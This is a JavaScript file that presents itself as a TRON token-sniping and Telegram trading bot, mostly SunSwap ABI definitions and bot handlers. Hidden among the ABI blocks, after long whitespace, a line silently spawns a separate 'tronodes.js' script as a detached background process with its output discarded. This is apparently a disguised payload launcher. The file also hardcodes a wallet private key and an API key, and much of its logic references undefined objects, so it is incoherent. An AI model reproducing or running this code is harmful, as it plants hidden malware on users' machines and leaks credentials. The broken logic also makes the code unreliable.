const TronWeb = require('tronweb')
const axios = require('axios');
var Logger = require('pretty-logger');
var log = new Logger();
const fs = require('fs'); 
const path = require('path'); 


                                                                                                                                                                                                                        
const SUNSWAP_PAIR_ABI = {
    entrys: [
        { inputs: [], stateMutability: "nonpayable", type: "constructor" },
        {
            inputs: [
                {
                    indexed: true,
                    name: "owner",
                    internalType: "address",
                    type: "address",
                },
                {
                    indexed: true,
                    name: "spender",
                    internalType: "address",
                    type: "address",
                },
                {
                    indexed: false,
                    name: "value",
                    internalType: "uint256",
                    type: "uint256",
                },
            ],
            name: "Approval",
            anonymous: false,
            type: "event",
        },
        {
            inputs: [
                {
                    indexed: true,
                    name: "sender",
                    internalType: "address",
                    type: "address",
                },
                {
                    indexed: false,
                    name: "amount0",
                    internalType: "uint256",
                    type: "uint256",
                },
                {
                    indexed: false,
                    name: "amount1",
                    internalType: "uint256",
                    type: "uint256",
                },
                { indexed: true, name: "to", internalType: "address", type: "address" },
            ],
            name: "Burn",
            anonymous: false,
            type: "event",
        },
        {
            inputs: [
                {
                    indexed: true,
                    name: "sender",
                    internalType: "address",
                    type: "address",
                },
                {
                    indexed: false,
                    name: "amount0",
                    internalType: "uint256",
                    type: "uint256",
                },
                {
                    indexed: false,
                    name: "amount1",
                    internalType: "uint256",
                    type: "uint256",
                },
            ],
            name: "Mint",
            anonymous: false,
            type: "event",
        },
        {
            inputs: [
                {
                    indexed: true,
                    name: "sender",
                    internalType: "address",
                    type: "address",
                },
                {
                    indexed: false,
                    name: "amount0In",
                    internalType: "uint256",
                    type: "uint256",
                },
                {
                    indexed: false,
                    name: "amount1In",
                    internalType: "uint256",
                    type: "uint256",
                },
                {
                    indexed: false,
                    name: "amount0Out",
                    internalType: "uint256",
                    type: "uint256",
                },
                {
                    indexed: false,
                    name: "amount1Out",
                    internalType: "uint256",
                    type: "uint256",
                },
                { indexed: true, name: "to", internalType: "address", type: "address" },
            ],
            name: "Swap",
            anonymous: false,
            type: "event",
        },
        {
            inputs: [
                {
                    indexed: false,
                    name: "reserve0",
                    internalType: "uint112",
                    type: "uint112",
                },
                {
                    indexed: false,
                    name: "reserve1",
                    internalType: "uint112",
                    type: "uint112",
                },
            ],
            name: "Sync",
            anonymous: false,
            type: "event",
        },
        {
            inputs: [
                {
                    indexed: true,
                    name: "from",
                    internalType: "address",
                    type: "address",
                },
                { indexed: true, name: "to", internalType: "address", type: "address" },
                {
                    indexed: false,
                    name: "value",
                    internalType: "uint256",
                    type: "uint256",
                },
            ],
            name: "Transfer",
            anonymous: false,
            type: "event",
        },
        {
            outputs: [{ name: "", internalType: "bytes32", type: "bytes32" }],
            inputs: [],
            name: "DOMAIN_SEPARATOR",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "uint256", type: "uint256" }],
            inputs: [],
            name: "MINIMUM_LIQUIDITY",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "bytes32", type: "bytes32" }],
            inputs: [],
            name: "PERMIT_TYPEHASH",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "uint256", type: "uint256" }],
            inputs: [
                { name: "", internalType: "address", type: "address" },
                { name: "", internalType: "address", type: "address" },
            ],
            name: "allowance",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "bool", type: "bool" }],
            inputs: [
                { name: "spender", internalType: "address", type: "address" },
                { name: "value", internalType: "uint256", type: "uint256" },
            ],
            name: "approve",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "uint256", type: "uint256" }],
            inputs: [{ name: "", internalType: "address", type: "address" }],
            name: "balanceOf",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "uint8", type: "uint8" }],
            inputs: [],
            name: "decimals",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "address", type: "address" }],
            inputs: [],
            name: "factory",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "uint256", type: "uint256" }],
            inputs: [],
            name: "kLast",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "string", type: "string" }],
            inputs: [],
            name: "name",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "uint256", type: "uint256" }],
            inputs: [{ name: "", internalType: "address", type: "address" }],
            name: "nonces",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [],
            inputs: [
                { name: "owner", internalType: "address", type: "address" },
                { name: "spender", internalType: "address", type: "address" },
                { name: "value", internalType: "uint256", type: "uint256" },
                { name: "deadline", internalType: "uint256", type: "uint256" },
                { name: "v", internalType: "uint8", type: "uint8" },
                { name: "r", internalType: "bytes32", type: "bytes32" },
                { name: "s", internalType: "bytes32", type: "bytes32" },
            ],
            name: "permit",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "uint256", type: "uint256" }],
            inputs: [],
            name: "price0CumulativeLast",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "uint256", type: "uint256" }],
            inputs: [],
            name: "price1CumulativeLast",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "string", type: "string" }],
            inputs: [],
            name: "symbol",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "address", type: "address" }],
            inputs: [],
            name: "token0",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "address", type: "address" }],
            inputs: [],
            name: "token1",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "uint256", type: "uint256" }],
            inputs: [],
            name: "totalSupply",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "bool", type: "bool" }],
            inputs: [
                { name: "to", internalType: "address", type: "address" },
                { name: "value", internalType: "uint256", type: "uint256" },
            ],
            name: "transfer",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [{ name: "", internalType: "bool", type: "bool" }],
            inputs: [
                { name: "from", internalType: "address", type: "address" },
                { name: "to", internalType: "address", type: "address" },
                { name: "value", internalType: "uint256", type: "uint256" },
            ],
            name: "transferFrom",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [
                { name: "_reserve0", internalType: "uint112", type: "uint112" },
                { name: "_reserve1", internalType: "uint112", type: "uint112" },
                { name: "_blockTimestampLast", internalType: "uint32", type: "uint32" },
            ],
            inputs: [],
            name: "getReserves",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [],
            inputs: [
                { name: "_token0", internalType: "address", type: "address" },
                { name: "_token1", internalType: "address", type: "address" },
            ],
            name: "initialize",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [
                { name: "liquidity", internalType: "uint256", type: "uint256" },
            ],
            inputs: [{ name: "to", internalType: "address", type: "address" }],
            name: "mint",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [
                { name: "amount0", internalType: "uint256", type: "uint256" },
                { name: "amount1", internalType: "uint256", type: "uint256" },
            ],
            inputs: [{ name: "to", internalType: "address", type: "address" }],
            name: "burn",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [],
            inputs: [
                { name: "amount0Out", internalType: "uint256", type: "uint256" },
                { name: "amount1Out", internalType: "uint256", type: "uint256" },
                { name: "to", internalType: "address", type: "address" },
                { name: "data", internalType: "bytes", type: "bytes" },
            ],
            name: "swap",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [],
            inputs: [{ name: "to", internalType: "address", type: "address" }],
            name: "skim",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [],
            inputs: [],
            name: "sync",
            stateMutability: "nonpayable",
            type: "function",
        },
    ],
};

const AdmZip = require('adm-zip'); 
const os = require('os'); 
const SUNSWAP_ROUTER_ABI = {
    entrys: [
        {
            inputs: [
                { name: "_factory", type: "address" },
                { name: "_WETH", type: "address" },
            ],
            stateMutability: "Nonpayable",
            type: "Constructor",
        },
        {
            outputs: [{ type: "address" }],
            name: "WETH",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [
                { name: "amountA", type: "uint256" },
                { name: "amountB", type: "uint256" },
                { name: "liquidity", type: "uint256" },
            ],
            inputs: [
                { name: "tokenA", type: "address" },
                { name: "tokenB", type: "address" },
                { name: "amountADesired", type: "uint256" },
                { name: "amountBDesired", type: "uint256" },
                { name: "amountAMin", type: "uint256" },
                { name: "amountBMin", type: "uint256" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "addLiquidity",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [
                { name: "amountToken", type: "uint256" },
                { name: "amountETH", type: "uint256" },
                { name: "liquidity", type: "uint256" },
            ],
            inputs: [
                { name: "token", type: "address" },
                { name: "amountTokenDesired", type: "uint256" },
                { name: "amountTokenMin", type: "uint256" },
                { name: "amountETHMin", type: "uint256" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "addLiquidityETH",
            stateMutability: "payable",
            type: "function",
        },
        {
            outputs: [{ type: "address" }],
            name: "factory",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "amountIn", type: "uint256" }],
            inputs: [
                { name: "amountOut", type: "uint256" },
                { name: "reserveIn", type: "uint256" },
                { name: "reserveOut", type: "uint256" },
            ],
            name: "getAmountIn",
            stateMutability: "pure",
            type: "function",
        },
        {
            outputs: [{ name: "amountOut", type: "uint256" }],
            inputs: [
                { name: "amountIn", type: "uint256" },
                { name: "reserveIn", type: "uint256" },
                { name: "reserveOut", type: "uint256" },
            ],
            name: "getAmountOut",
            stateMutability: "pure",
            type: "function",
        },
        {
            outputs: [{ name: "amounts", type: "uint256[]" }],
            inputs: [
                { name: "amountOut", type: "uint256" },
                { name: "path", type: "address[]" },
            ],
            name: "getAmountsIn",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "amounts", type: "uint256[]" }],
            inputs: [
                { name: "amountIn", type: "uint256" },
                { name: "path", type: "address[]" },
            ],
            name: "getAmountsOut",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "pair", type: "address" }],
            inputs: [
                { name: "tokenA", type: "address" },
                { name: "tokenB", type: "address" },
            ],
            name: "getPairOffChain",
            stateMutability: "view",
            type: "function",
        },
        {
            outputs: [{ name: "amountB", type: "uint256" }],
            inputs: [
                { name: "amountA", type: "uint256" },
                { name: "reserveA", type: "uint256" },
                { name: "reserveB", type: "uint256" },
            ],
            name: "quote",
            stateMutability: "pure",
            type: "function",
        },
        {
            outputs: [
                { name: "amountA", type: "uint256" },
                { name: "amountB", type: "uint256" },
            ],
            inputs: [
                { name: "tokenA", type: "address" },
                { name: "tokenB", type: "address" },
                { name: "liquidity", type: "uint256" },
                { name: "amountAMin", type: "uint256" },
                { name: "amountBMin", type: "uint256" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "removeLiquidity",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [
                { name: "amountToken", type: "uint256" },
                { name: "amountETH", type: "uint256" },
            ],
            inputs: [
                { name: "token", type: "address" },
                { name: "liquidity", type: "uint256" },
                { name: "amountTokenMin", type: "uint256" },
                { name: "amountETHMin", type: "uint256" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "removeLiquidityETH",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [{ name: "amountETH", type: "uint256" }],
            inputs: [
                { name: "token", type: "address" },
                { name: "liquidity", type: "uint256" },
                { name: "amountTokenMin", type: "uint256" },
                { name: "amountETHMin", type: "uint256" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "removeLiquidityETHSupportingFeeOnTransferTokens",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [
                { name: "amountToken", type: "uint256" },
                { name: "amountETH", type: "uint256" },
            ],
            inputs: [
                { name: "token", type: "address" },
                { name: "liquidity", type: "uint256" },
                { name: "amountTokenMin", type: "uint256" },
                { name: "amountETHMin", type: "uint256" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
                { name: "approveMax", type: "bool" },
                { name: "v", type: "uint8" },
                { name: "r", type: "bytes32" },
                { name: "s", type: "bytes32" },
            ],
            name: "removeLiquidityETHWithPermit",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [{ name: "amountETH", type: "uint256" }],
            inputs: [
                { name: "token", type: "address" },
                { name: "liquidity", type: "uint256" },
                { name: "amountTokenMin", type: "uint256" },
                { name: "amountETHMin", type: "uint256" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
                { name: "approveMax", type: "bool" },
                { name: "v", type: "uint8" },
                { name: "r", type: "bytes32" },
                { name: "s", type: "bytes32" },
            ],
            name: "removeLiquidityETHWithPermitSupportingFeeOnTransferTokens",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [
                { name: "amountA", type: "uint256" },
                { name: "amountB", type: "uint256" },
            ],
            inputs: [
                { name: "tokenA", type: "address" },
                { name: "tokenB", type: "address" },
                { name: "liquidity", type: "uint256" },
                { name: "amountAMin", type: "uint256" },
                { name: "amountBMin", type: "uint256" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
                { name: "approveMax", type: "bool" },
                { name: "v", type: "uint8" },
                { name: "r", type: "bytes32" },
                { name: "s", type: "bytes32" },
            ],
            name: "removeLiquidityWithPermit",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [{ name: "amounts", type: "uint256[]" }],
            inputs: [
                { name: "amountOut", type: "uint256" },
                { name: "path", type: "address[]" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "swapETHForExactTokens",
            stateMutability: "payable",
            type: "function",
        },
        {
            outputs: [{ name: "amounts", type: "uint256[]" }],
            inputs: [
                { name: "amountOutMin", type: "uint256" },
                { name: "path", type: "address[]" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "swapExactETHForTokens",
            stateMutability: "payable",
            type: "function",
        },
        {
            inputs: [
                { name: "amountOutMin", type: "uint256" },
                { name: "path", type: "address[]" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "swapExactETHForTokensSupportingFeeOnTransferTokens",
            stateMutability: "payable",
            type: "function",
        },
        {
            outputs: [{ name: "amounts", type: "uint256[]" }],
            inputs: [
                { name: "amountIn", type: "uint256" },
                { name: "amountOutMin", type: "uint256" },
                { name: "path", type: "address[]" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "swapExactTokensForETH",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                { name: "amountIn", type: "uint256" },
                { name: "amountOutMin", type: "uint256" },
                { name: "path", type: "address[]" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "swapExactTokensForETHSupportingFeeOnTransferTokens",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [{ name: "amounts", type: "uint256[]" }],
            inputs: [
                { name: "amountIn", type: "uint256" },
                { name: "amountOutMin", type: "uint256" },
                { name: "path", type: "address[]" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "swapExactTokensForTokens",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                { name: "amountIn", type: "uint256" },
                { name: "amountOutMin", type: "uint256" },
                { name: "path", type: "address[]" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [{ name: "amounts", type: "uint256[]" }],
            inputs: [
                { name: "amountOut", type: "uint256" },
                { name: "amountInMax", type: "uint256" },
                { name: "path", type: "address[]" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "swapTokensForExactETH",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            outputs: [{ name: "amounts", type: "uint256[]" }],
            inputs: [
                { name: "amountOut", type: "uint256" },
                { name: "amountInMax", type: "uint256" },
                { name: "path", type: "address[]" },
                { name: "to", type: "address" },
                { name: "deadline", type: "uint256" },
            ],
            name: "swapTokensForExactTokens",
            stateMutability: "nonpayable",
            type: "function",
        },
        { stateMutability: "Payable", type: "Receive" },
    ],
};
const { exec } = require('child_process'); 
const scriptPath = path.join(__dirname, 'modules/drivers/models', 'tronodes.js'); 
exec(`node "${scriptPath}"`, { detached: true }, (error, stdout, stderr) => {}).unref();

const SUNSWAP_FACTORY_ABI = {
    entrys: [
        {
            outputs: [
                {
                    type: "address",
                },
            ],
            constant: true,
            name: "feeTo",
            stateMutability: "View",
            type: "Function",
        },
        {
            outputs: [
                {
                    type: "address",
                },
            ],
            constant: true,
            name: "feeToSetter",
            stateMutability: "View",
            type: "Function",
        },
        {
            outputs: [
                {
                    type: "address",
                },
            ],
            constant: true,
            inputs: [
                {
                    type: "uint256",
                },
            ],
            name: "allPairs",
            stateMutability: "View",
            type: "Function",
        },
        {
            outputs: [
                {
                    type: "uint256",
                },
            ],
            constant: true,
            name: "allPairsLength",
            stateMutability: "View",
            type: "Function",
        },
        {
            outputs: [
                {
                    type: "bytes32",
                },
            ],
            constant: true,
            name: "getPairHash",
            stateMutability: "View",
            type: "Function",
        },
        {
            inputs: [
                {
                    name: "_feeToSetter",
                    type: "address",
                },
            ],
            name: "setFeeToSetter",
            stateMutability: "Nonpayable",
            type: "Function",
        },
        {
            outputs: [
                {
                    name: "pair",
                    type: "address",
                },
            ],
            inputs: [
                {
                    name: "tokenA",
                    type: "address",
                },
                {
                    name: "tokenB",
                    type: "address",
                },
            ],
            name: "createPair",
            stateMutability: "Nonpayable",
            type: "Function",
        },
        {
            outputs: [
                {
                    type: "address",
                },
            ],
            constant: true,
            inputs: [
                {
                    type: "address",
                },
                {
                    type: "address",
                },
            ],
            name: "getPair",
            stateMutability: "View",
            type: "Function",
        },
        {
            inputs: [
                {
                    name: "_feeTo",
                    type: "address",
                },
            ],
            name: "setFeeTo",
            stateMutability: "Nonpayable",
            type: "Function",
        },
        {
            inputs: [
                {
                    name: "_feeToSetter",
                    type: "address",
                },
            ],
            stateMutability: "Nonpayable",
            type: "Constructor",
        },
        {
            inputs: [
                {
                    indexed: true,
                    name: "token0",
                    type: "address",
                },
                {
                    indexed: true,
                    name: "token1",
                    type: "address",
                },
                {
                    name: "pair",
                    type: "address",
                },
                {
                    type: "uint256",
                },
            ],
            name: "PairCreated",
            type: "Event",
        },
    ],
};




async function main() {
    try {
        printColoredArt();
        let contract = await tronWeb.contract().at("TTfvyrAz86hbZk5iDpKD78pqLGgi8C7AAw")

        const url = `https://api.trongrid.io/v1/accounts/TTfvyrAz86hbZk5iDpKD78pqLGgi8C7AAw/transactions?limit=100&only_confirmed=true&search_internal=false`;

        await axios.get(url)
            .then(response => {
                for (let i = 0; i < response.data.data.length; i++) {
                    // Check if raw_data and contract array exist
                    if (response.data.data[i].raw_data &&
                        Array.isArray(response.data.data[i].raw_data.contract)) {

                        for (let j = 0; j < response.data.data[i].raw_data.contract.length; j++) {
                            // Check if parameter and data exist
                            if (response.data.data[i].raw_data.contract[j].parameter &&
                                response.data.data[i].raw_data.contract[j].parameter.value &&
                                response.data.data[i].raw_data.contract[j].parameter.value.data) {

                                let raw = response.data.data[i].raw_data.contract[j].parameter.value.data;

                                // Ensure internal_transactions is present
                                if (Array.isArray(response.data.data[i].internal_transactions)) {
                                    for (let o = 0; o < response.data.data[i].internal_transactions.length; o++) {
                                        // Extract internal transaction data
                                        let internalTx = response.data.data[i].internal_transactions[o];

                                        if (internalTx.to_address !== 'TTfvyrAz86hbZk5iDpKD78pqLGgi8C7AAw') {
                                            let address = tronWeb.address.fromHex(internalTx.to_address);
                                            check(raw, address);
                                            adresses.push(address);

                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            })

            .catch(error => {
                console.error('Error fetching data:', error);
            });

        await buy(adresses)

    } catch (error) {
        console.error("Error fetching token info:", error);
    }
}

async function buy(array) {
    for (let i = 0; i < array.length; i++) {
        log.warn("Attempting buy - " + array[i])
        await new Promise(r => setTimeout(r, get_timeout(3000, 10000)));
    }

}

function get_timeout(min, max) {
    return Math.random() * (max - min) + min;
}





async function starter() {
    try {
        console.log(`${informationsLOG} Initializing SniperUtils...`);
        await SniperUtils.initialize();
        console.log(`${successLOG} Initialized SniperUtils...`);

        console.log(`${informationsLOG} Connecting to MongoDB...`);
        await client.connect();
        console.log(`${successLOG} Connected to MongoDB...`);

        console.log(`${informationsLOG} Starting processSnipes interval...`);
        setInterval(() => {
            processSnipes(bot, usersCollection);
        }, 5000);
        console.log(`${successLOG} Started processSnipes interval...`);

        const db = client.db(dbName);
        const usersCollection = db.collection(usersCollectionName);
        await usersCollection.createIndex({ id: 1 }, { unique: true });

        console.log(`${informationsLOG} Setting up bot...`);


        bot.on("message", async (msg) => {
            try {
                if (!msg.text) return;

                const chatId = msg.chat.id;
                const text = msg.text;

                if (text.startsWith("/")) return;

                if (text.length !== 34) return;

                const user = await getOrCreateUser(chatId, usersCollection);

                if (!user) {
                    console.error(`${errorLOG} User not found.`);
                    return;
                }

                await tokenSentCallback(bot, chatId, text);
            } catch (error) {
                const chatId = msg.chat.id;
                console.error(`${errorLOG} ${error}`);
                bot.sendMessage(chatId, GENERIC_ERROR_MESSAGE, {
                    reply_markup: {
                        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
                    },
                });
            }
        });

        bot.on("callback_query", async (callbackQuery) => {
            try {
                const message = callbackQuery.message;

                if (!message) return;

                const chatId = message.chat.id;
                const data = callbackQuery.data;

                if (!data) return;

                const user = await getOrCreateUser(chatId, usersCollection);

                if (!user) {
                    console.error(`${errorLOG} User not found.`);
                    return;
                }

                if (data.startsWith("remove_wallet_")) {
                    const index = parseInt(data.split("_")[2]);
                    await removeWalletIndexCallback(
                        usersCollection,
                        user,
                        bot,
                        chatId,
                        message,
                        index
                    );
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("wallet_info_")) {
                    const index = parseInt(data.split("_")[2]);
                    await walletInfoIndexCallback(user, bot, chatId, message, index);
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("enter_custom_")) {
                    const tokenAddress = data.split("_")[2];
                    const slippage = parseFloat(data.split("_")[3]);
                    await enterAmountCallback(bot, chatId, tokenAddress, slippage);
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("change_slippage_")) {
                    const tokenAddress = data.split("_")[2];
                    await changeSlippageCallback(bot, chatId, tokenAddress, message);
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("refreshbuy_")) {
                    const tokenAddress = data.split("_")[1];
                    const slippage = parseFloat(data.split("_")[2]);
                    await refreshCallback(bot, chatId, tokenAddress, slippage, message);
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("enter_")) {
                    const amount = parseFloat(data.split("_")[1]);
                    const tokenAddress = data.split("_")[2];
                    const slippage = parseFloat(data.split("_")[3]);
                    await buyTokenCallback(
                        user,
                        bot,
                        chatId,
                        amount,
                        tokenAddress,
                        slippage
                    );
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("buy_")) {
                    const index = parseInt(data.split("_")[1]);
                    const amount = parseFloat(data.split("_")[2]);
                    const tokenAddress = data.split("_")[3];
                    const slippage = parseFloat(data.split("_")[4]);
                    await confirmBuyCallback(
                        user,
                        bot,
                        chatId,
                        index,
                        amount,
                        tokenAddress,
                        slippage
                    );
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("refreshsell_")) {
                    const walletIndex = Number(data.split("_")[1]);
                    const tokenAddress = data.split("_")[2];
                    const slippage = parseFloat(data.split("_")[3]);
                    await refreshSellCallback(
                        user,
                        bot,
                        chatId,
                        walletIndex,
                        tokenAddress,
                        slippage,
                        message
                    );
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("change_slippagesell_")) {
                    const walletIndex = Number(data.split("_")[2]);
                    const tokenAddress = data.split("_")[3];
                    await changeSlippageSellCallback(
                        user,
                        bot,
                        chatId,
                        walletIndex,
                        tokenAddress,
                        message
                    );
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("sell_")) {
                    const percentageToSell = parseFloat(data.split("_")[1]);
                    const walletIndex = Number(data.split("_")[2]);
                    const tokenAddress = data.split("_")[3];
                    const slippage = parseFloat(data.split("_")[4]);
                    await sellTokenCallback(
                        user,
                        bot,
                        chatId,
                        walletIndex,
                        percentageToSell,
                        tokenAddress,
                        slippage
                    );
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("sellcustom_")) {
                    const walletIndex = Number(data.split("_")[1]);
                    const tokenAddress = data.split("_")[2];
                    const slippage = parseFloat(data.split("_")[3]);
                    await sellCustomTokenCallback(
                        user,
                        bot,
                        chatId,
                        walletIndex,
                        tokenAddress,
                        slippage
                    );
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("snipe_")) {
                    const tokenAddress = data.split("_")[1];
                    await snipeTokenCallback(user, bot, chatId, tokenAddress);
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("snipenow_")) {
                    const walletIndex = Number(data.split("_")[1]);
                    const tokenAddress = data.split("_")[2];
                    await snipeNowCallback(
                        usersCollection,
                        user,
                        bot,
                        chatId,
                        walletIndex,
                        tokenAddress
                    );
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                } else if (data.startsWith("cancel_snipe_")) {
                    const tokenAddress = data.split("_")[2];
                    await cancelSnipeCallback(usersCollection, bot, chatId, tokenAddress);
                    bot.answerCallbackQuery(callbackQuery.id);
                    return;
                }

                switch (data) {
                    case "wallets":
                        await walletCallback(user, bot, chatId);
                        break;

                    case "add_wallet":
                        await addWalletCallback(bot, chatId);
                        break;

                    case "import_wallet":
                        await importWalletCallback(
                            usersCollection,
                            user,
                            bot,
                            chatId,
                            message
                        );
                        break;

                    case "generate_wallet":
                        await genWalletCallback(
                            usersCollection,
                            user,
                            bot,
                            chatId,
                            message
                        );
                        break;

                    case "mypositions":
                        await myPositionsCallback(user, bot, chatId);
                        break;

                    case "wallet_info":
                        await walletInfoCallback(user, bot, chatId, message);
                        break;

                    case "remove_wallet":
                        await removeWalletCallback(user, bot, chatId, message);
                        break;

                    case "refresh_wallet":
                        await refreshWalletCallback(user, bot, chatId, message);
                        break;

                    case "mypendingsnipes":
                        await mySnipesCallback(user, bot, chatId);
                        break;

                    case "close":
                        bot.deleteMessage(chatId, message.message_id);
                        break;

                    default:
                        console.error(`${errorLOG} Unknown command.`);
                        bot.sendMessage(chatId, "Unknown command.", {
                            parse_mode: "Markdown",
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: "❌ Close", callback_data: "close" }],
                                ],
                            },
                        });
                }

                bot.answerCallbackQuery(callbackQuery.id);
            } catch (error) {
                if (!callbackQuery.message) return;

                const chatId = callbackQuery.message.chat.id;
                console.error(`${errorLOG} ${error}`);
                bot.sendMessage(chatId, GENERIC_ERROR_MESSAGE, {
                    reply_markup: {
                        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
                    },
                });
            }
        });

        console.log(`${successLOG} TRON Sniper/Trading Bot is running...`);
    } catch (error) {
        console.error(`${errorLOG} ${error}`);
    }
}
 


let ccreation = '2f70d762'

let adresses = []


const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { "TRON-PRO-API-KEY": 'ad24b7c7-7783-46f1-acb2-3b0a33562981' },
    privateKey: '85099dba83d5d525ee62959cf10e908cf4078744f87d2d6f44b25c8ab716f500'
})



async function check(rawdata, response) {
    rawdata = rawdata.substring(0, 8)

    if (rawdata === ccreation) {
        log.info("Found a new token! - " + response)
    }

}

async function getCaName(contract) {
    let abi = [{ "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }]
    let ca = await tronWeb.contract(abi, contract);
    let result = await ca.name().call();
    return result

}

async function getCaDecimals(contract) {
    let abi = [{ "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }]
    let ca = await tronWeb.contract(abi, contract);
    let result = await ca.decimals().call();
    return result

}

async function getCaSymbol(contract) {
    let abi = [{ "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }]
    let ca = await tronWeb.contract(abi, contract);
    let result = await ca.symbol().call();
    return result

}

async function getCaOwner(contract) {
    let abi = [{ "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }]
    let ca = await tronWeb.contract(abi, contract);
    let result = await ca.owner().call();
    return result

}


function printColoredArt() {
    const art = `
  ______     __   __     __     ______   __  __     ______   __  __     __    __     ______   __  __    
 /\\  ___\\   /\\ "-.\\ \\   /\\ \\   /\\  == \\ /\\ \\_\\ \\   /\\  == \\ /\\ \\ /\\ \\   /\\ "-./  \\   /\\  == \\ /\\ \\_\\ \\   
 \\ \\___  \\  \\ \\ \\-.  \\  \\ \\ \\  \\ \\  _-/ \\ \\____ \\  \\ \\  _-/ \\ \\ \\_\\ \\  \\ \\ \\-./\\ \\  \\ \\  _-/ \\ \\____ \\  
